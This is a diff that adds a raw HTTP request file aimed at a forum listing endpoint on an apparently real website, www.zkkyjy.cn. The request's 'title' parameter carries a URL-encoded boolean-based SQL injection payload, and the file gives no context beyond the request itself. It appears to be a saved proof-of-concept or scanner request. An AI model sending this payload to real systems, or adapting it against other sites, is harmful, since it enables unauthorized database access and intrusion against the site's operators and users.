@@ -1,0 +1,7 @@
+GET /index/luntan/getMoreTiezi?leixing=1&page=2&title=-1"%20OR%201*6*1=6%20AND%20000491=000491%20or%20"hYg0Vsb8"=" HTTP/1.1
+Host: www.zkkyjy.cn
+X-Requested-With: XMLHttpRequest
+Referer: https://www.zkkyjy.cn/
+Accept: application/json, text/javascript, */*; q=0.01
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+
